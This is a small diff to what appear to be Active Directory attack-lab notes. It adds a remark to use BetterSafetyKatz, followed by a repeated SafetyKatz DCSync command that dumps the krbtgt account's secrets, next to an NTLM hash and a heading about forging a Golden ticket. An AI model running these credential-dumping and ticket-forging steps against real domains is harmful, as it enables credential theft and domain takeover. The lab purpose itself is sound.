@@ -376,3 +376,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 | NTLM | 07e8be316e3da9a042a9cb681df19bf5 |
 
 *Using the secrets of krbtgt account, create a Golden ticket*
+Just use BetterSafetyKatz
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
